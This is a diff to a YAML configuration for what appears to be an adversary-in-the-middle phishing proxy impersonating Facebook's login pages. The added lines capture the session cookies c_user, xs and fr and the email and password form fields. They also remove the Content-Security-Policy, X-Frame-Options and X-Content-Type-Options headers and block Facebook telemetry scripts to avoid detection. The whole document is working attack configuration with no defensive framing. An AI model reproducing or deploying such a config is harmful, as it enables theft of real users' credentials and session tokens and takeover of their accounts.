@@ -6,16 +6,24 @@ proxy_hosts:
     target: "www.facebook.com"
 auth_urls: ["/login", "/login/device-based/regular/login"]
 landing_path: ["/login"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "c_user"}
+  - {type: "cookie", name: "xs"}
+  - {type: "cookie", name: "fr"}
+credentials:
+  - {type: "post_param", name: "email", regex: null}
+  - {type: "post_param", name: "pass", regex: null}
+  - {type: "post_param", name: "login", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-Content-Type-Options"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/tr/|/connect/xd_arbiter", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/tr/|/connect/xd_arbiter|/impression.php", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/login/device"}
 bridges:
